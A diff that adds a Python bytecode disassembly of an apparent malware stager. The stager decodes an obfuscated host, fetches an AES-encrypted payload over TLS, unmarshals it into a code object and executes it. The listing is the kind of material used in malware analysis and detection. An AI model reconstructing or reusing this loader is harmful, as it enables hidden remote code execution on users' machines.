@@ -1,0 +1,150 @@
+code:f
+0000 LOAD_CONST               0
+0002 LOAD_CONST               None
+0004 IMPORT_NAME              socket
+0006 STORE_FAST               socket
+0008 LOAD_CONST               0
+0010 LOAD_CONST               None
+0012 IMPORT_NAME              ssl
+0014 STORE_FAST               ssl
+0016 LOAD_CONST               0
+0018 LOAD_CONST               ('AES',)
+0020 IMPORT_NAME              Crypto.Cipher
+0022 IMPORT_FROM              AES
+0024 STORE_FAST               AES
+0026 POP_TOP                  
+0028 LOAD_CONST               0
+0030 LOAD_CONST               None
+0032 IMPORT_NAME              marshal
+0034 STORE_FAST               marshal
+0036 LOAD_FAST                ssl
+0038 LOAD_METHOD              create_default_context
+0040 CALL_METHOD              0 positional arguments
+0042 LOAD_ATTR                wrap_socket
+0044 LOAD_FAST                socket
+0046 LOAD_METHOD              socket
+0048 LOAD_FAST                socket
+0050 LOAD_ATTR                AF_INET
+0052 LOAD_FAST                socket
+0054 LOAD_ATTR                SOCK_STREAM
+0056 CALL_METHOD              2 positional arguments
+0058 LOAD_CONST               ""
+0060 LOAD_METHOD              join
+0062 LOAD_CONST               <Code310 code object f at 0x7f9f8e5095b0, file <module>>, line 8
+0064 LOAD_CONST               "meow.<locals>.<genexpr>"
+0066 MAKE_FUNCTION            No arguments
+0068 LOAD_CONST               b'GOE]\x04YSF\\CO\x04LSC'
+0070 GET_ITER                 
+0072 CALL_FUNCTION            1 positional argument
+0074 CALL_METHOD              1 positional argument
+0076 LOAD_CONST               ('server_hostname',)
+0078 CALL_FUNCTION_KW         2 total positional and keyword args
+0080 STORE_FAST               _
+0082 LOAD_FAST                _
+0084 LOAD_METHOD              connect
+0086 LOAD_CONST               ""
+0088 LOAD_METHOD              join
+0090 LOAD_CONST               <Code310 code object f at 0x7f9f8e509d30, file <module>>, line 9
+0092 LOAD_CONST               "meow.<locals>.<genexpr>"
+0094 MAKE_FUNCTION            No arguments
+0096 LOAD_CONST               b'`hbz#~ta{dh#ktd'
+0098 GET_ITER                 
+0100 CALL_FUNCTION            1 positional argument
+0102 CALL_METHOD              1 positional argument
+0104 LOAD_CONST               443
+0106 BUILD_TUPLE              
+0108 CALL_METHOD              1 positional argument
+0110 POP_TOP                  
+0112 LOAD_FAST                _
+0114 LOAD_METHOD              sendall
+0116 LOAD_CONST               b''
+0118 LOAD_METHOD              join
+0120 LOAD_CONST               <Code310 code object f at 0x7f9f8e50a0c0, file <module>>, line 10
+0122 LOAD_CONST               "meow.<locals>.<genexpr>"
+0124 MAKE_FUNCTION            No arguments
+0126 LOAD_CONST               b'\x13\x11\x00t{\' 5 =7{\'!\'$=7=;!\'\x0b59;:3\x0b!\'t\x1c\x00\x00\x04{ezeY^\x1c;\' nt91;#z\'-8"=1z2-=Y^\x17;::17 =;:nt78;\'1Y^Y^'
+0128 GET_ITER                 
+0130 CALL_FUNCTION            1 positional argument
+0132 CALL_METHOD              1 positional argument
+0134 CALL_METHOD              1 positional argument
+0136 POP_TOP                  
+0138 LOAD_CONST               b''
+0140 STORE_FAST               ___
+0142 NOP                      
+0144 LOAD_FAST                _
+0146 LOAD_METHOD              recv
+0148 LOAD_CONST               4096
+0150 CALL_METHOD              1 positional argument
+0152 STORE_FAST               __
+0154 LOAD_FAST                __
+0156 POP_JUMP_IF_TRUE         to 160
+0158 JUMP_FORWARD             to 170
+0160 LOAD_FAST                ___
+0162 LOAD_FAST                __
+0164 INPLACE_ADD              
+0166 STORE_FAST               ___
+0168 JUMP_ABSOLUTE            to 144
+0170 LOAD_FAST                _
+0172 LOAD_METHOD              close
+0174 CALL_METHOD              0 positional arguments
+0176 POP_TOP                  
+0178 LOAD_FAST                ___
+0180 LOAD_FAST                ___
+0182 LOAD_METHOD              index
+0184 LOAD_CONST               b'\r\n\r\n'
+0186 CALL_METHOD              1 positional argument
+0188 LOAD_CONST               4
+0190 BINARY_ADD               
+0192 LOAD_CONST               None
+0194 BUILD_SLICE              
+0196 BINARY_SUBSCR            
+0198 STORE_FAST               ___
+0200 LOAD_FAST                AES
+0202 LOAD_ATTR                new
+0204 LOAD_CONST               b''
+0206 LOAD_METHOD              join
+0208 LOAD_CONST               <Code310 code object f at 0x7f9f8e938dd0, file <module>>, line 19
+0210 LOAD_CONST               "meow.<locals>.<genexpr>"
+0212 MAKE_FUNCTION            No arguments
+0214 LOAD_CONST               b'4=\xf9\xcd\x87\xd9s;P\xae5\x02\xb9\xe8dYa\xf9\xe86L\xf8$8\x01u\x8aK\x17\xdd\xd8\xe9'
+0216 GET_ITER                 
+0218 CALL_FUNCTION            1 positional argument
+0220 CALL_METHOD              1 positional argument
+0222 LOAD_CONST               11
+0224 LOAD_FAST                ___
+0226 LOAD_CONST               -16
+0228 LOAD_CONST               None
+0230 BUILD_SLICE              
+0232 BINARY_SUBSCR            
+0234 LOAD_CONST               ('nonce',)
+0236 CALL_FUNCTION_KW         3 total positional and keyword args
+0238 LOAD_METHOD              decrypt_and_verify
+0240 LOAD_FAST                ___
+0242 LOAD_CONST               None
+0244 LOAD_CONST               -32
+0246 BUILD_SLICE              
+0248 BINARY_SUBSCR            
+0250 LOAD_FAST                ___
+0252 LOAD_CONST               -32
+0254 LOAD_CONST               -16
+0256 BUILD_SLICE              
+0258 BINARY_SUBSCR            
+0260 CALL_METHOD              2 positional arguments
+0262 STORE_FAST               _____
+0264 LOAD_FAST                marshal
+0266 LOAD_METHOD              loads
+0268 LOAD_FAST                _____
+0270 CALL_METHOD              1 positional argument
+0272 STORE_FAST               ______
+0274 LOAD_CONST               <Code310 code object f at 0x7f9f8e50a420, file <module>>, line 21
+0276 LOAD_CONST               "meow.<locals>._______"
+0278 MAKE_FUNCTION            No arguments
+0280 STORE_FAST               _______
+0282 LOAD_FAST                ______
+0284 LOAD_FAST                _______
+0286 STORE_ATTR               __code__
+0288 LOAD_FAST                _______
+0290 CALL_FUNCTION            0 positional arguments
+0292 POP_TOP                  
+0294 LOAD_CONST               None
+0296 RETURN_VALUE             
